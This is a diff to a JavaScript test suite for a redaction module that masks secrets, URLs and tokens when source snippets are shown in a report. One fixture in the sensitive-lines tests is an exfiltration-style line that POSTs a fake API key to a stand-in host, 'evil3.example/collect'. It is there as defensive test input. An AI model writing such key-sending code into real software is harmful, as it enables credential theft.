@@ -4,19 +4,21 @@
 import assert from "node:assert/strict";
 import { describe, it } from "node:test";
 
-import { scrubDeep, scrubText } from "../src/redact.mjs";
+import { scrubDeep, scrubText, sourceText } from "../src/redact.mjs";
 import { renderHtml } from "../src/report/html.mjs";
 import { displayLdflags } from "../src/rules/go.mjs";
-import { continuesString, sourceLine } from "../src/source-line.mjs";
+import { continuation, sourceLine } from "../src/source-line.mjs";
 import { displayPath, displayUrl } from "../src/urls.mjs";
 import { app, at, evaluate, fact, side } from "./helpers.mjs";
 
 // The snippet as a report prints it: through the report's scrubbing too.
-const shown = (line, needle, sensitive = false) =>
-  scrubDeep(sourceLine(line, Math.max(0, line.indexOf(needle)), sensitive));
+const shown = (line, needle, reading = {}) =>
+  scrubDeep(
+    sourceText(sourceLine(line, Math.max(0, line.indexOf(needle)), reading)),
+  );
 
-const assertMasked = (line, needle, secrets, sensitive = false) => {
-  const text = shown(line, needle, sensitive);
+const assertMasked = (line, needle, secrets, reading = {}) => {
+  const text = shown(line, needle, reading);
   for (const secret of secrets)
     assert.ok(!text.includes(secret), `${secret} shown in ${text}`);
   assert.ok(text.includes(needle), `${needle} lost from ${text}`);
@@ -197,7 +199,9 @@ describe("source lines: secrets whatever the syntax", () => {
 
   it("masks URLs that are JSON-escaped, relative or behind character references", () => {
     for (const [line, needle, secrets] of URL_CASES)
-      assertMasked(line, needle, secrets);
+      assertMasked(line, needle, secrets, {
+        file: line.startsWith("<") ? "index.html" : "src/app.js",
+      });
   });
 
   it("masks JWTs, base64 with '/', '+' or '=' padding, and long hex runs", () => {
@@ -242,13 +246,15 @@ describe("source lines: what stays readable", () => {
       const name = call.match(/\w+\(/)[0];
       assert.ok(shown(line, name).includes(call), shown(line, name));
       assert.ok(
-        shown(line, name, true).includes(name),
-        shown(line, name, true),
+        shown(line, name, { sensitive: true }).includes(name),
+        shown(line, name, { sensitive: true }),
       );
     }
     // A quote inside a regex literal or a word does not close a string.
     for (const [line] of cases.slice(0, 3))
-      assert.ok(shown(line, "(", true).startsWith(line.slice(0, 12)));
+      assert.ok(
+        shown(line, "(", { sensitive: true }).startsWith(line.slice(0, 12)),
+      );
   });
 
   it("maps the cited column through masks, so the call stays in the window", () => {
@@ -269,7 +275,7 @@ describe("source lines: what stays readable", () => {
       "https://n24.example/v1?key=FAKE+plus+0002",
       "https://n9.example/v1/FAKEabcdefghij1234567890KLMN/x?key=FAKEQVALUE",
     ]) {
-      const tags = displayUrl(url).match(/‹[0-9a-f]{4}›/g);
+      const tags = displayUrl(url).match(/‹[0-9a-f]{6}›/g);
       const snippet = sourceLine(`fetch("${url}")`);
       for (const tag of tags) assert.ok(snippet.includes(tag), snippet);
     }
@@ -279,14 +285,16 @@ describe("source lines: what stays readable", () => {
 describe("source lines: sensitive lines", () => {
   const key = "sk-proj-DEMO-not-a-real-key-000000000000000000";
 
-  it("masks every string and shorter token-like word, keeping the call", () => {
+  it("masks every string but URLs and keywords, and shorter token-like words", () => {
     const text = assertMasked(
-      `const K="${key}";const A="FAKEshort01";export const send=()=>fetch("https://evil3.example/collect",{body:K});`,
+      `const K="${key}";const A="FAKEshort01";export const send=()=>fetch("https://evil3.example/collect?k=FAKEq1",{body:K,method:"POST"});`,
       "fetch(",
-      [key.slice(8), "FAKEshort01", "evil3.example/collect"],
-      true,
+      [key.slice(8), "FAKEshort01", "FAKEq1"],
+      { sensitive: true },
     );
     assert.match(text, /sk-proj-…0000 \(46 characters\)/);
+    assert.match(text, /fetch\("https:\/\/evil3\.example\/collect\?k=‹/);
+    assert.ok(text.includes('method:"POST"'), text);
   });
 
   it("masks a continued key fragment before the cited call", () => {
@@ -294,11 +302,11 @@ describe("source lines: sensitive lines", () => {
       `FAKEqRs8tUv1wXy";async function show(t){const r=await fetch("https://api.openai.com/v1/chat/completions",{method:"POST"})}`,
       "fetch(",
       ["FAKEqRs8tUv1wXy"],
-      true,
+      { sensitive: true },
     );
-    assert.equal(continuesString(`const K="sk-proj-FAKE\\`), true);
-    assert.equal(continuesString(`const K="a\\\\"`), false);
-    assert.equal(continuesString(`x = "a\\\\\\`), true);
+    assert.equal(continuation(`const K="sk-proj-FAKE\\`).escaped, true);
+    assert.equal(continuation(`const K="a\\\\"`).escaped, false);
+    assert.equal(continuation(`x = "a\\\\\\`).escaped, true);
   });
 });
 
@@ -474,7 +482,7 @@ describe("prompt previews", () => {
       side(
         "v2",
         prompt(
-          "You are helpful. Read https://docs.acmenotes.example/v2/guide.html?token=FAKEpp01 and sign with FAKESummer2024Summer2024 please.",
+          "You are helpful. Read https://docs.acmenotes.example/v2/guide.html?token=FAKEpp01 and sign with FAKEq8Zk2MwX7pTr4NvB9yHc please.",
         ),
       ),
     );
